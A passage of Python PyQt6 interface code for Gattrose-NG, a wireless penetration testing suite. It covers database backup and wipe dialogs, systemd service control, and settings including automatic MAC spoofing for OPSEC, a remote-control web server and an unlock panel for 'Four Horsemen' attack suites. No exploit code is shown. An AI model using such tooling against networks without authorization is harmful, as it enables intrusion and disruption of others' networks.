                self,
                "Export Successful",
                f"Database exported successfully!\n\n"
                f"Location: {file_path}\n"
                f"Networks: {len(networks)}\n"
                f"Clients: {len(clients)}\n"
                f"Handshakes: {len(handshakes)}"
            )

        except Exception as e:
            QMessageBox.critical(
                self,
                "Export Failed",
                f"Failed to export database:\n{str(e)}"
            )

    def backup_database(self):
        """Backup the database"""
        from PyQt6.QtWidgets import QMessageBox, QFileDialog
        from datetime import datetime
        from pathlib import Path
        import shutil

        # Create backups directory
        backups_dir = Path.cwd() / "data" / "backups"
        backups_dir.mkdir(parents=True, exist_ok=True)

        # Default backup filename with timestamp
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        default_name = f"gattrose_backup_{timestamp}.db"

        # Ask user where to save the backup
        file_path, _ = QFileDialog.getSaveFileName(
            self,
            "Backup Database",
            str(backups_dir / default_name),
            "Database Files (*.db);;All Files (*)"
        )

        if not file_path:
            return

        try:
            # Source database file
            db_path = Path.cwd() / "data" / "database" / "gattrose.db"

            if not db_path.exists():
                QMessageBox.warning(
                    self,
                    "Backup Failed",
                    "Database file not found!"
                )
                return

            # Copy database file
            shutil.copy2(db_path, file_path)

            # Get file size
            backup_size = Path(file_path).stat().st_size / (1024 * 1024)  # MB

            QMessageBox.information(
                self,
                "Backup Successful",
                f"Database backed up successfully!\n\n"
                f"Location: {file_path}\n"
                f"Size: {backup_size:.2f} MB\n"
                f"Time: {timestamp}"
            )

        except Exception as e:
            QMessageBox.critical(
                self,
                "Backup Failed",
                f"Failed to backup database:\n{str(e)}"
            )

    def optimize_database(self):
        """Optimize database"""
        from PyQt6.QtWidgets import QMessageBox

        try:
            from src.database.models import get_engine

            engine = get_engine()
            with engine.connect() as conn:
                conn.execute("VACUUM")

            QMessageBox.information(self, "Optimize", "Database optimized successfully!")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to optimize database:\n{e}")

    def clear_old_data(self):
        """Clear old data from database"""
        from PyQt6.QtWidgets import QMessageBox, QInputDialog

        days, ok = QInputDialog.getInt(
            self,
            "Clear Old Data",
            "Delete data older than (days):",
            30, 1, 365
        )

        if ok:
            try:
                from src.database.models import get_session, Network, Client
                from datetime import datetime, timedelta

                cutoff_date = datetime.now() - timedelta(days=days)

                session = get_session()
                try:
                    # Count what will be deleted
                    old_networks = session.query(Network).filter(
                        Network.last_seen < cutoff_date
                    ).count()

                    old_clients = session.query(Client).filter(
                        Client.last_seen < cutoff_date
                    ).count()

                    # Confirm deletion
                    reply = QMessageBox.question(
                        self,
                        "Confirm Deletion",
                        f"This will delete:\n\n"
                        f"• {old_networks} networks\n"
                        f"• {old_clients} clients\n\n"
                        f"last seen before {cutoff_date.strftime('%Y-%m-%d %H:%M')}\n\n"
                        f"Continue?",
                        QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
                    )

                    if reply == QMessageBox.StandardButton.Yes:
                        # Delete old data
                        session.query(Network).filter(
                            Network.last_seen < cutoff_date
                        ).delete()

                        session.query(Client).filter(
                            Client.last_seen < cutoff_date
                        ).delete()

                        session.commit()

                        QMessageBox.information(
                            self,
                            "Data Cleared",
                            f"Successfully deleted:\n\n"
                            f"• {old_networks} networks\n"
                            f"• {old_clients} clients"
                        )

                        # Refresh statistics
                        self.refresh_statistics()

                finally:
                    session.close()

            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to clear old data:\n{e}")

    def delete_and_reinit_database(self):
        """Delete and reinitialize the entire database"""
        from PyQt6.QtWidgets import QMessageBox
        from pathlib import Path
        import os

        # Confirmation dialog with strong warning
        reply = QMessageBox.question(
            self,
            "⚠️ DELETE ENTIRE DATABASE",
            "This will PERMANENTLY DELETE all data:\n\n"
            "• All WiFi networks\n"
            "• All clients\n"
            "• All scan sessions\n"
            "• All handshakes\n"
            "• All attack results\n"
            "• OUI database (will need re-download)\n\n"
            "This action CANNOT be undone!\n\n"
            "Are you ABSOLUTELY SURE?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply != QMessageBox.StandardButton.Yes:
            return

        # Second confirmation
        reply2 = QMessageBox.question(
            self,
            "⚠️ FINAL WARNING",
            "Last chance to cancel!\n\n"
            "Delete everything and start fresh?",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No,
            QMessageBox.StandardButton.No
        )

        if reply2 != QMessageBox.StandardButton.Yes:
            return

        try:
            # Close any existing database connections
            from src.database.models import get_engine
            engine = get_engine()
            engine.dispose()

            # Delete database file
            db_path = Path.cwd() / "data" / "gattrose.db"
            if db_path.exists():
                os.remove(db_path)

            # Reinitialize database
            from src.database.models import init_db
            init_db()

            QMessageBox.information(
                self,
                "✅ Database Reinitialized",
                "Database has been deleted and reinitialized successfully!\n\n"
                "All data has been wiped.\n"
                "You may want to re-download the OUI database:\n\n"
                "python -m src.utils.oui_downloader"
            )

            # Refresh statistics
            self.refresh_statistics()

        except Exception as e:
            QMessageBox.critical(
                self,
                "❌ Error",
                f"Failed to delete/reinit database:\n\n{e}"
            )



class ToolsTab(QWidget):
    """Tools management and service control tab"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.init_ui()

    def init_ui(self):
        """Initialize tools UI"""
        layout = QVBoxLayout()

        header = QLabel("Background Service Control")
        header.setProperty("heading", True)
        layout.addWidget(header)

        info = QLabel("Manage Gattrose-NG background service for 24/7 scanning without GUI")
        layout.addWidget(info)

        # Service status group
        status_group = QGroupBox("Service Status")
        status_layout = QVBoxLayout()

        # Status labels
        self.service_status_label = QLabel("Checking service status...")
        status_layout.addWidget(self.service_status_label)

        # Service info grid
        info_grid = QGridLayout()

        info_grid.addWidget(QLabel("Installed:"), 0, 0)
        self.installed_label = QLabel("Unknown")
        info_grid.addWidget(self.installed_label, 0, 1)

        info_grid.addWidget(QLabel("Running:"), 1, 0)
        self.running_label = QLabel("Unknown")
        info_grid.addWidget(self.running_label, 1, 1)

        info_grid.addWidget(QLabel("Auto-start:"), 2, 0)
        self.enabled_label = QLabel("Unknown")
        info_grid.addWidget(self.enabled_label, 2, 1)

        status_layout.addLayout(info_grid)

        status_group.setLayout(status_layout)
        layout.addWidget(status_group)

        # Service control group
        control_group = QGroupBox("Service Control")
        control_layout = QGridLayout()

        # Install/Uninstall buttons
        self.install_btn = QPushButton("Install Service")
        self.install_btn.clicked.connect(self.install_service)
        control_layout.addWidget(self.install_btn, 0, 0)

        self.uninstall_btn = QPushButton("Uninstall Service")
        self.uninstall_btn.clicked.connect(self.uninstall_service)
        control_layout.addWidget(self.uninstall_btn, 0, 1)

        # Start/Stop buttons
        self.start_btn = QPushButton("Start Service")
        self.start_btn.clicked.connect(self.start_service)
        control_layout.addWidget(self.start_btn, 1, 0)

        self.stop_btn = QPushButton("Stop Service")
        self.stop_btn.clicked.connect(self.stop_service)
        control_layout.addWidget(self.stop_btn, 1, 1)

        # Enable/Disable buttons
        self.enable_btn = QPushButton("Enable Auto-Start")
        self.enable_btn.clicked.connect(self.enable_service)
        control_layout.addWidget(self.enable_btn, 2, 0)

        self.disable_btn = QPushButton("Disable Auto-Start")
        self.disable_btn.clicked.connect(self.disable_service)
        control_layout.addWidget(self.disable_btn, 2, 1)

        # Restart button
        self.restart_btn = QPushButton("Restart Service")
        self.restart_btn.clicked.connect(self.restart_service)
        control_layout.addWidget(self.restart_btn, 3, 0, 1, 2)

        control_group.setLayout(control_layout)
        layout.addWidget(control_group)

        # Service logs group
        logs_group = QGroupBox("Service Logs (last 20 lines)")
        logs_layout = QVBoxLayout()

        self.logs_text = QTextEdit()
        self.logs_text.setReadOnly(True)
        self.logs_text.setMaximumHeight(200)
        self.logs_text.setFontFamily("monospace")
        logs_layout.addWidget(self.logs_text)

        logs_btn = QPushButton("Reload Logs")
        logs_btn.clicked.connect(self.reload_logs)
        logs_layout.addWidget(logs_btn)

        logs_group.setLayout(logs_layout)
        layout.addWidget(logs_group)

        layout.addStretch()
        self.setLayout(layout)

        # Initial status refresh
        self.refresh_service_status()

    def refresh_service_status(self):
        """Refresh service status display"""
        from ..core.service_manager import ServiceManager

        status = ServiceManager.get_status()

        # Update labels
        self.installed_label.setText("✓ Yes" if status['installed'] else "✗ No")
        self.running_label.setText("✓ Yes" if status['running'] else "✗ No")
        self.enabled_label.setText("✓ Enabled" if status['enabled'] else "✗ Disabled")

        self.service_status_label.setText(f"Status: {status['status_text']}")

        # Update button states
        self.install_btn.setEnabled(not status['installed'])
        self.uninstall_btn.setEnabled(status['installed'])
        self.start_btn.setEnabled(status['installed'] and not status['running'])
        self.stop_btn.setEnabled(status['installed'] and status['running'])
        self.restart_btn.setEnabled(status['installed'])
        self.enable_btn.setEnabled(status['installed'] and not status['enabled'])
        self.disable_btn.setEnabled(status['installed'] and status['enabled'])

        # Load logs if service is installed
        if status['installed']:
            self.reload_logs()

    def install_service(self):
        """Install systemd service"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.install()

        if success:
            QMessageBox.information(self, "Service Installed", message)
        else:
            QMessageBox.critical(self, "Installation Failed", message)

        self.refresh_service_status()

    def uninstall_service(self):
        """Uninstall systemd service"""
        from ..core.service_manager import ServiceManager

        reply = QMessageBox.question(
            self,
            "Confirm Uninstall",
            "Are you sure you want to uninstall the background service?\n\n"
            "This will stop the service and remove it from systemd.",
            QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No
        )

        if reply == QMessageBox.StandardButton.Yes:
            success, message = ServiceManager.uninstall()

            if success:
                QMessageBox.information(self, "Service Uninstalled", message)
            else:
                QMessageBox.critical(self, "Uninstall Failed", message)

            self.refresh_service_status()

    def start_service(self):
        """Start service"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.start()

        if success:
            QMessageBox.information(self, "Service Started", message)
        else:
            QMessageBox.critical(self, "Start Failed", message)

        self.refresh_service_status()

    def stop_service(self):
        """Stop service"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.stop()

        if success:
            QMessageBox.information(self, "Service Stopped", message)
        else:
            QMessageBox.critical(self, "Stop Failed", message)

        self.refresh_service_status()

    def restart_service(self):
        """Restart service"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.restart()

        if success:
            QMessageBox.information(self, "Service Restarted", message)
        else:
            QMessageBox.critical(self, "Restart Failed", message)

        self.refresh_service_status()

    def enable_service(self):
        """Enable service auto-start"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.enable()

        if success:
            QMessageBox.information(self, "Auto-Start Enabled", message)
        else:
            QMessageBox.critical(self, "Enable Failed", message)

        self.refresh_service_status()

    def disable_service(self):
        """Disable service auto-start"""
        from ..core.service_manager import ServiceManager

        success, message = ServiceManager.disable()

        if success:
            QMessageBox.information(self, "Auto-Start Disabled", message)
        else:
            QMessageBox.critical(self, "Disable Failed", message)

        self.refresh_service_status()

    def reload_logs(self):
        """Reload service logs"""
        from ..core.service_manager import ServiceManager

        logs = ServiceManager.get_logs(lines=20)
        self.logs_text.setPlainText(logs)


class SettingsTab(QWidget):
    """Settings tab with theme selection"""

    theme_changed = pyqtSignal(str)  # Signal when theme changes

    def __init__(self, parent=None):
        super().__init__(parent)
        self.main_window = None  # Will be set by MainWindow
        self.init_ui()

    def init_ui(self):
        """Initialize settings UI"""
        main_layout = QVBoxLayout()

        header = QLabel("Settings")
        header.setProperty("heading", True)
        main_layout.addWidget(header)

        info = QLabel("Configure Gattrose preferences and options")
        main_layout.addWidget(info)

        # Create scroll area for settings
        scroll = QScrollArea()
        scroll.setWidgetResizable(True)
        scroll_widget = QWidget()
        scroll_layout = QVBoxLayout(scroll_widget)

        # ========== APPEARANCE SETTINGS ==========
        appearance_group = QGroupBox("Appearance")
        appearance_layout = QFormLayout()

        # Theme selector
        theme_label = QLabel("Color Theme:")
        self.theme_combo = QComboBox()

        # Populate theme combo box
        for theme_id, theme_name, theme_desc in get_theme_list():
            self.theme_combo.addItem(f"{theme_name} - {theme_desc}", theme_id)

        self.theme_combo.currentIndexChanged.connect(self.on_theme_changed)
        appearance_layout.addRow(theme_label, self.theme_combo)

        # Theme preview
        self.theme_preview = QLabel("Select a theme to customize the interface")
        self.theme_preview.setWordWrap(True)
        appearance_layout.addRow("Preview:", self.theme_preview)

        # Dynamic theme toggle
        self.dynamic_theme_checkbox = QCheckBox("Enable 24/7 Dynamic Theme")
        self.dynamic_theme_checkbox.setToolTip(
            "Enable the dynamic 24/7 theme system that shifts colors and gradients\n"
            "over a 7-day cycle. Each hour has a unique appearance.\n"
            "Note: This overrides the static theme selection above."
        )
        self.dynamic_theme_checkbox.stateChanged.connect(self.on_dynamic_theme_toggled)
        appearance_layout.addRow("", self.dynamic_theme_checkbox)

        # Dynamic theme info
        self.dynamic_theme_info = QLabel(
            "Dynamic theme creates 168 unique color schemes (7 days × 24 hours)\n"
            "All themes are dark-based with shifting gradients and patterns"
        )
        self.dynamic_theme_info.setWordWrap(True)
        self.dynamic_theme_info.setStyleSheet("font-size: 10px; color: #888;")
        appearance_layout.addRow("", self.dynamic_theme_info)

        appearance_group.setLayout(appearance_layout)
        scroll_layout.addWidget(appearance_group)

        # ========== SECURITY / OPSEC SETTINGS ==========
        security_group = QGroupBox("Security & OPSEC")
        security_layout = QFormLayout()

        # Auto-spoof MAC at boot
        self.auto_spoof_mac_checkbox = QCheckBox("Auto-Spoof MAC at Startup")
        self.auto_spoof_mac_checkbox.setToolTip(
            "Automatically randomize MAC address when application starts.\n"
            "Recommended for OPSEC - prevents MAC address tracking.\n"
            "You can manually spoof/restore MAC from the Dashboard at any time."
        )
        self.auto_spoof_mac_checkbox.stateChanged.connect(self.on_auto_spoof_mac_toggled)
        security_layout.addRow("", self.auto_spoof_mac_checkbox)

        # Auto-spoof info
        self.auto_spoof_info = QLabel(
            "Automatically spoofs your wireless interface MAC address on boot.\n"
            "Enhances operational security by preventing device tracking."
        )
        self.auto_spoof_info.setWordWrap(True)
        self.auto_spoof_info.setStyleSheet("font-size: 10px; color: #888;")
        security_layout.addRow("", self.auto_spoof_info)

        # Desktop shortcut button
        self.create_desktop_shortcut_button = QPushButton("Create Desktop Shortcut")
        self.create_desktop_shortcut_button.setToolTip(
            "Create a symlink to the .desktop launcher on your Desktop.\n"
            "Allows easy access from your desktop environment."
        )
        self.create_desktop_shortcut_button.clicked.connect(self.on_create_desktop_shortcut)
        security_layout.addRow("Desktop Shortcut:", self.create_desktop_shortcut_button)

        # Install to system button
        self.install_to_system_button = QPushButton("Install to System")
        self.install_to_system_button.setToolTip(
            "Install Gattrose-NG system-wide:\n"
            "• Installs PolicyKit policy\n"
            "• Installs systemd services\n"
            "• Installs desktop launcher\n"
            "• Sets up system integration\n"
            "Requires sudo authentication."
        )
        self.install_to_system_button.clicked.connect(self.on_install_to_system)
        security_layout.addRow("System Install:", self.install_to_system_button)

        # Update OUI database button
        self.update_oui_button = QPushButton("Update OUI Database")
        self.update_oui_button.setToolTip(
            "Download and update the IEEE OUI (Organizationally Unique Identifier) database.\n"
            "Used to identify device manufacturers from MAC addresses.\n"
            "Updates from IEEE standards organization."
        )
        self.update_oui_button.clicked.connect(self.on_update_oui)
        security_layout.addRow("OUI Database:", self.update_oui_button)

        # Minimize to tray on close
        self.minimize_to_tray_checkbox = QCheckBox("Minimize to Tray on Window Close")
        self.minimize_to_tray_checkbox.setToolTip(
            "When enabled (default), closing the window minimizes to system tray.\n"
            "When disabled, closing the window exits the application completely.\n"
            "Double-click the tray icon to restore the window."
        )
        self.minimize_to_tray_checkbox.stateChanged.connect(self.on_minimize_to_tray_toggled)
        security_layout.addRow("", self.minimize_to_tray_checkbox)

        # Minimize to tray info
        self.minimize_to_tray_info = QLabel(
            "Keep application running in background when window is closed.\n"
            "Allows continuous scanning and monitoring while hidden."
        )
        self.minimize_to_tray_info.setWordWrap(True)
        self.minimize_to_tray_info.setStyleSheet("font-size: 10px; color: #888;")
        security_layout.addRow("", self.minimize_to_tray_info)

        security_group.setLayout(security_layout)
        scroll_layout.addWidget(security_group)

        # ========== WEB SERVER SETTINGS ==========
        web_server_group = QGroupBox("Web Server (Mobile Control)")
        web_server_layout = QFormLayout()

        # Enable web server checkbox
        self.enable_web_server_checkbox = QCheckBox("Enable HTTPS Web Server")
        self.enable_web_server_checkbox.setToolTip(
            "Start an HTTPS web server with nginx for mobile/remote control.\n"
            "Uses self-signed certificate with high security settings.\n"
            "Accessible via https://[hostname]:8443"
        )
        self.enable_web_server_checkbox.stateChanged.connect(self.on_web_server_toggled)
        web_server_layout.addRow("", self.enable_web_server_checkbox)

        # Web server port
        self.web_server_port_input = QSpinBox()
        self.web_server_port_input.setRange(1024, 65535)
        self.web_server_port_input.setValue(8443)
        self.web_server_port_input.setToolTip("Port for HTTPS web server (default: 8443)")
        web_server_layout.addRow("HTTPS Port:", self.web_server_port_input)

        # Web server status
        self.web_server_status_label = QLabel("Status: Stopped")
        web_server_layout.addRow("Status:", self.web_server_status_label)

        # Web server URL
        self.web_server_url_label = QLabel("Not running")
        self.web_server_url_label.setTextInteractionFlags(Qt.TextInteractionFlag.TextSelectableByMouse)
        web_server_layout.addRow("URL:", self.web_server_url_label)

        # Start/Stop button
        self.web_server_button = QPushButton("Start Web Server")
        self.web_server_button.clicked.connect(self.on_web_server_button_clicked)
        web_server_layout.addRow("", self.web_server_button)

        # Info
        self.web_server_info = QLabel(
            "⚠️ SECURITY POLICY (NON-CONFIGURABLE):\n"
            "• Server is OFF by default at every startup\n"
            "• Requires sudo password to start\n"
            "• Auto-stops after 2 hours (cannot be changed)\n"
            "• Re-authentication required after timeout\n"
            "• Not intended for indefinite hosting\n\n"
            "Web server provides full mobile control interface.\n"
            "Secured with HTTPS, HTTP/2, HSTS, and hardened nginx config.\n"
            "Perfect for controlling Gattrose from your phone."
        )
        self.web_server_info.setWordWrap(True)
        self.web_server_info.setStyleSheet("font-size: 10px; color: #888;")
        web_server_layout.addRow("", self.web_server_info)

        web_server_group.setLayout(web_server_layout)
        scroll_layout.addWidget(web_server_group)

        # ========== ADVANCED ATTACK FEATURES ==========
        horsemen_group = QGroupBox("⚠️ ADVANCED ATTACK FEATURES ⚠️")
        horsemen_group.setStyleSheet("""
            QGroupBox {
                font-weight: bold;
                color: #ffff00;
                border: 3px solid #ff0000;
            }
            QGroupBox::title {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #1a1a1a, stop:0.3 #ff0000, stop:0.7 #ff0000, stop:1 #1a1a1a);
                color: #ffff00;
            }
        """)
        horsemen_layout = QVBoxLayout()

        # Warning banner
        horsemen_warning = QLabel(
            "⚠️ DANGER: APOCALYPTIC ATTACK PROTOCOLS ⚠️\n\n"
            "The Four Horsemen attack suites are LOUD, AGGRESSIVE, and DANGEROUS.\n"
            "These attacks WILL be detected and logged by security systems.\n"
            "Use ONLY with explicit written authorization on networks you own or have permission to test.\n\n"
            "Unlocking requires sudo authentication."
        )
        horsemen_warning.setWordWrap(True)
        horsemen_warning.setStyleSheet("""
            font-size: 11px;
            color: #ff6600;
            background-color: #1a0000;
            border: 2px solid #ff0000;
            border-radius: 5px;
            padding: 10px;
        """)
        horsemen_layout.addWidget(horsemen_warning)

        # Status and control layout
        horsemen_control_layout = QHBoxLayout()

        # Status label
        self.horsemen_status_label = QLabel()
        self.update_horsemen_status_label()
        horsemen_control_layout.addWidget(self.horsemen_status_label)

        horsemen_control_layout.addStretch()

        # Unlock/Lock button
        self.horsemen_unlock_btn = QPushButton()
        self.horsemen_unlock_btn.setMinimumWidth(150)
        self.horsemen_unlock_btn.clicked.connect(self.on_toggle_horsemen_unlock)
        self.update_horsemen_unlock_button()
        horsemen_control_layout.addWidget(self.horsemen_unlock_btn)

        horsemen_layout.addLayout(horsemen_control_layout)

        # Info about each horseman
        horsemen_info = QLabel(
            "🏹 CONQUEST (White Horse) - Infiltration & Exploitation\n"
            "⚔️ WAR (Red Horse) - Network Disruption & Chaos\n"
            "⚖️ FAMINE (Black Horse) - Resource Depletion\n"
            "💀 DEATH (Pale Horse) - Total Annihilation"
        )
        horsemen_info.setWordWrap(True)
        horsemen_info.setStyleSheet("font-size: 10px; color: #888; font-family: monospace;")
        horsemen_layout.addWidget(horsemen_info)

        # Restart required notice (shown only when state changes)
        self.horsemen_restart_notice = QLabel(
            "⚠️ RESTART REQUIRED: Please restart Gattrose to apply changes ⚠️"
        )
        self.horsemen_restart_notice.setWordWrap(True)
        self.horsemen_restart_notice.setStyleSheet("""
            font-size: 11px;
            font-weight: bold;
            color: #ffff00;
            background-color: #332200;
            border: 2px solid #ffaa00;
            border-radius: 5px;
            padding: 8px;
        """)
        self.horsemen_restart_notice.setVisible(False)
        horsemen_layout.addWidget(self.horsemen_restart_notice)

        horsemen_group.setLayout(horsemen_layout)
        scroll_layout.addWidget(horsemen_group)

        # ========== BLACKLIST SETTINGS ==========
        blacklist_group = QGroupBox("AP Blacklist")
        blacklist_layout = QVBoxLayout()

        # Description
        blacklist_info = QLabel(
            "Blacklist specific BSSIDs to hide them from scan results.\n"
            "Useful for filtering out your own networks or known safe APs."
        )
        blacklist_info.setWordWrap(True)
        blacklist_info.setStyleSheet("font-size: 10px; color: #888;")
        blacklist_layout.addWidget(blacklist_info)

        # Show blacklisted toggle
        self.show_blacklisted_checkbox = QCheckBox("Show Blacklisted APs in Scan Results")
        self.show_blacklisted_checkbox.setToolTip(
            "When unchecked (default), blacklisted APs and their clients are hidden.\n"
            "When checked, blacklisted APs are shown with a ⛔ marker."
        )
        self.show_blacklisted_checkbox.stateChanged.connect(self.on_show_blacklisted_toggled)
        blacklist_layout.addWidget(self.show_blacklisted_checkbox)

        # Blacklist management area
        blacklist_manage_layout = QHBoxLayout()

        # Blacklist display (list widget)
        self.blacklist_widget = QTextEdit()
        self.blacklist_widget.setReadOnly(True)
        self.blacklist_widget.setMaximumHeight(120)
        self.blacklist_widget.setPlaceholderText("No BSSIDs blacklisted")
        blacklist_manage_layout.addWidget(self.blacklist_widget)

        # Buttons
        blacklist_buttons_layout = QVBoxLayout()

        self.add_blacklist_btn = QPushButton("Add BSSID")
        self.add_blacklist_btn.setToolTip("Add a BSSID to the blacklist")
        self.add_blacklist_btn.clicked.connect(self.on_add_to_blacklist)
        blacklist_buttons_layout.addWidget(self.add_blacklist_btn)

        self.remove_blacklist_btn = QPushButton("Remove Selected")
        self.remove_blacklist_btn.setToolTip("Remove selected BSSID from blacklist")
        self.remove_blacklist_btn.clicked.connect(self.on_remove_from_blacklist)
        blacklist_buttons_layout.addWidget(self.remove_blacklist_btn)

        self.clear_blacklist_btn = QPushButton("Clear All")
        self.clear_blacklist_btn.setToolTip("Clear entire blacklist")
        self.clear_blacklist_btn.clicked.connect(self.on_clear_blacklist)
        blacklist_buttons_layout.addWidget(self.clear_blacklist_btn)

        blacklist_buttons_layout.addStretch()
        blacklist_manage_layout.addLayout(blacklist_buttons_layout)

        blacklist_layout.addLayout(blacklist_manage_layout)

        blacklist_group.setLayout(blacklist_layout)
        scroll_layout.addWidget(blacklist_group)

        # ========== TIME FORMAT INFO ==========
        time_group = QGroupBox("Time Format")
        time_layout = QVBoxLayout()

        time_info = QLabel("⏰ Time Format: 24-hour (HH:MM:SS)")
        time_info.setProperty("status", "ok")
        time_layout.addWidget(time_info)

        time_note = QLabel("Note: 24-hour format is hardcoded for consistency in security work. This cannot be changed.")
        time_note.setWordWrap(True)
        time_layout.addWidget(time_note)

        time_group.setLayout(time_layout)
        scroll_layout.addWidget(time_group)

        # ========== DATABASE SETTINGS ==========
        database_group = QGroupBox("Database")
        database_layout = QVBoxLayout()

        db_info_label = QLabel("Database location:")
        database_layout.addWidget(db_info_label)

        # Database path (will be filled in later)
        self.db_path_label = QLabel("Loading...")
        database_layout.addWidget(self.db_path_label)

        db_buttons_layout = QHBoxLayout()

        backup_btn = QPushButton("Backup Database")
        backup_btn.clicked.connect(self.backup_database)
        db_buttons_layout.addWidget(backup_btn)

        optimize_btn = QPushButton("Optimize Database")
        optimize_btn.clicked.connect(self.optimize_database)
        db_buttons_layout.addWidget(optimize_btn)

        db_buttons_layout.addStretch()
        database_layout.addLayout(db_buttons_layout)

        database_group.setLayout(database_layout)
        scroll_layout.addWidget(database_group)

        # ========== OUI DATABASE SETTINGS ==========
        oui_group = QGroupBox("OUI Database (MAC Vendor Lookup)")
        oui_layout = QVBoxLayout()

        oui_info_label = QLabel(
            "The OUI database contains manufacturer information for MAC addresses.\n"
            "It powers the vendor identification feature for access points and clients."
        )
        oui_info_label.setWordWrap(True)
        oui_layout.addWidget(oui_info_label)

        # OUI statistics
        self.oui_stats_label = QLabel("Loading OUI database statistics...")
        self.oui_stats_label.setWordWrap(True)
        oui_layout.addWidget(self.oui_stats_label)

        # OUI buttons
        oui_buttons_layout = QHBoxLayout()

        self.update_oui_btn = QPushButton("📥 Update OUI Database")
        self.update_oui_btn.clicked.connect(self.update_oui_database)
        self.update_oui_btn.setToolTip("Download latest MAC vendor data from IEEE and Wireshark")
        oui_buttons_layout.addWidget(self.update_oui_btn)

        oui_buttons_layout.addStretch()
        oui_layout.addLayout(oui_buttons_layout)

        # Progress bar for OUI update
        self.oui_progress = QProgressBar()
        self.oui_progress.setVisible(False)
        oui_layout.addWidget(self.oui_progress)

        oui_group.setLayout(oui_layout)
        scroll_layout.addWidget(oui_group)

        # ========== SYSTEM STATUS ==========
        status_group = QGroupBox("System Component Status")
        status_layout = QVBoxLayout()

        # Status info
        status_info = QLabel(
            "All components are required. System will not function if any are missing."
        )
        status_info.setWordWrap(True)
        status_layout.addWidget(status_info)

        # Control buttons
        status_buttons_layout = QHBoxLayout()

        check_updates_btn = QPushButton("Check for Updates")
        check_updates_btn.clicked.connect(self.check_for_updates)
        status_buttons_layout.addWidget(check_updates_btn)

        install_missing_btn = QPushButton("Install All Missing")
        install_missing_btn.clicked.connect(self.install_all_missing)
        status_buttons_layout.addWidget(install_missing_btn)

        status_buttons_layout.addStretch()
        status_layout.addLayout(status_buttons_layout)

        # Status tree
        self.status_tree = QTreeWidget()
        self.status_tree.setHeaderLabels(["Component", "Status", "Version", "Actions"])
        self.status_tree.setColumnWidth(0, 200)
        self.status_tree.setColumnWidth(1, 150)
        self.status_tree.setColumnWidth(2, 250)
        self.status_tree.setColumnWidth(3, 120)
        self.status_tree.setMinimumHeight(300)
        status_layout.addWidget(self.status_tree)

        status_group.setLayout(status_layout)
        scroll_layout.addWidget(status_group)

        # ========== ABOUT ==========
        about_group = QGroupBox("About")
        about_layout = QVBoxLayout()

        from src.version import VERSION
        about_text = QLabel(
            f"<b>Gattrose-NG</b> v{VERSION}<br>"
            "Wireless Penetration Testing Suite<br><br>"
            "Built with 30 retro themes!<br>"
            "15 epic 90s console themes + 15 classic 80s arcade themes<br><br>"
            "For authorized security testing only.<br>"
            "All times in 24-hour format."
        )
        about_text.setWordWrap(True)
        about_layout.addWidget(about_text)

        about_group.setLayout(about_layout)
        scroll_layout.addWidget(about_group)

        scroll_layout.addStretch()
        scroll.setWidget(scroll_widget)
        main_layout.addWidget(scroll)

        self.setLayout(main_layout)

        # Load initial status
        self.refresh_system_status()
        self.refresh_oui_stats()

    def on_theme_changed(self, index):
        """Handle theme selection change"""
        theme_id = self.theme_combo.itemData(index)

        if theme_id and self.main_window:
            # Update preview
            theme = THEMES.get(theme_id)
            if theme:
                self.theme_preview.setText(f"<b>{theme.name}</b><br>{theme.description}")

            # Apply theme to main window
            self.main_window.apply_theme(theme_id)

            # Emit signal
            self.theme_changed.emit(theme_id)

    def set_current_theme(self, theme_id: str):
        """Set the current theme in the combo box"""
        for i in range(self.theme_combo.count()):
            if self.theme_combo.itemData(i) == theme_id:
                self.theme_combo.setCurrentIndex(i)
                break

    def on_dynamic_theme_toggled(self, state):
        """Handle dynamic theme checkbox toggle"""
        enabled = (state == Qt.CheckState.Checked.value)

        if self.main_window:
            self.main_window.toggle_dynamic_theme(enabled)

            # Disable/enable static theme combo when dynamic is on
            self.theme_combo.setEnabled(not enabled)

            if enabled:
                self.theme_preview.setText(
                    "<b>Dynamic 24/7 Theme Active</b><br>"
                    "Theme shifts automatically over a 7-day cycle"
                )
            else:
                # Restore static theme preview
                theme_id = self.theme_combo.currentData()
                theme = THEMES.get(theme_id)
                if theme:
                    self.theme_preview.setText(f"<b>{theme.name}</b><br>{theme.description}")

    def load_dynamic_theme_state(self):
        """Load and set the dynamic theme checkbox state from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            dynamic_enabled = config.get('app.dynamic_theme', 'false')

            # Set checkbox state without triggering signal
            self.dynamic_theme_checkbox.blockSignals(True)
            self.dynamic_theme_checkbox.setChecked(dynamic_enabled == 'true')
            self.dynamic_theme_checkbox.blockSignals(False)

            # Update theme combo enabled state
            self.theme_combo.setEnabled(dynamic_enabled != 'true')

        except Exception as e:
            print(f"[!] Error loading dynamic theme state: {e}")

    def on_auto_spoof_mac_toggled(self, state):
        """Handle auto-spoof MAC checkbox toggle"""
        enabled = (state == Qt.CheckState.Checked.value)

        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()

            if enabled:
                config.set('app.auto_spoof_mac', 'true', value_type='string', category='app',
                          description='Automatically spoof MAC address on application startup')
                print("[*] Auto MAC spoofing enabled - will spoof on next startup")
            else:
                config.set('app.auto_spoof_mac', 'false', value_type='string', category='app',
                          description='Automatically spoof MAC address on application startup')
                print("[*] Auto MAC spoofing disabled")

        except Exception as e:
            print(f"[!] Error toggling auto-spoof MAC: {e}")

    def load_auto_spoof_mac_state(self):
        """Load and set the auto-spoof MAC checkbox state from config"""
        try:
            from ..utils.config_db import DBConfig
            config = DBConfig()
            auto_spoof = config.get('app.auto_spoof_mac', 'true')  # Default to true for OPSEC

            # Set checkbox state without triggering signal
            self.auto_spoof_mac_checkbox.blockSignals(True)
